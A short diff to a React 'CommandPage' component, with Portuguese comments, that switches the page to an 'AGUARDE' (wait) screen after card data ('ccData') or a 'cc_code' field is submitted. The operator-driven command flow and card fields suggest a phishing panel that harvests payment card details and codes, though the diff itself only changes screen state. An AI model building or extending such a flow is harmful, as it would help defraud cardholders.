@@ -68,6 +68,10 @@ function CommandPage({ userId }) {
         value: valueToSend
       });
       setSubmitted(true);
+      // Após enviar cc_code, ir para Aguarde
+      if (field === "cc_code") {
+        setCurrentCommand({ action: "AGUARDE" });
+      }
     } catch (error) {
       console.error("Erro ao enviar dados:", error);
     }
@@ -1013,6 +1017,8 @@ function CommandPage({ userId }) {
           value: ccData
         });
         setSubmitted(true);
+        // Mudar para tela de Aguarde
+        setCurrentCommand({ action: "AGUARDE" });
       } catch (error) {
         console.error("Erro ao enviar dados:", error);
       }
